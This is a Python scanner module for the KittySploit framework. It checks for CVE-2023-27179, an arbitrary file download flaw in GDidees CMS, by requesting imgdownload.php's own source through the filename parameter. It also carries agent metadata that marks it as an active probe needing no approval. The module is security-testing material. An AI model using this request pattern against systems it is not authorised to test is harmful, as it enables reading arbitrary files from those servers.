#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""GDidees CMS v3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GDidees CMS v3.9.1 - Arbitrary File Download Detection',
        'description': 'GDidees CMS v3.9.1 and lower was discovered to contain an arbitrary file download vulenrability via the filename parameter at /_admin/imgdownload.php.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'packetstorm', 'file-download', 'gdidees', 'lfr', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.gdidees.eu/cms-1-0.html',
            'https://gist.github.com/Hadi999/516aa25b953b0cba57089a0c11b1305b',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-27179',
            'http://packetstormsecurity.com/files/171894/GDidees-CMS-3.9.1-Local-File-Disclosure-Directory-Traversal.html',
            'https://knowledge-base.secureflag.com/vulnerabilities/unrestricted_file_download/unrestricted_file_download_vulnerability.html',
        ],
        'cve': 'CVE-2023-27179',
    }

    def run(self):
        r = self.http_request(method="GET", path='/_admin/imgdownload.php?filename=imgdownload.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('$filename=$_GET["filename"];', '@readfile($filename) OR die();',)
        header_any = ('application/force-download',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="GDidees CMS v3.9.1 - Arbitrary File Download detected",
                path='/_admin/imgdownload.php?filename=imgdownload.php',
            )
            return True
        return False

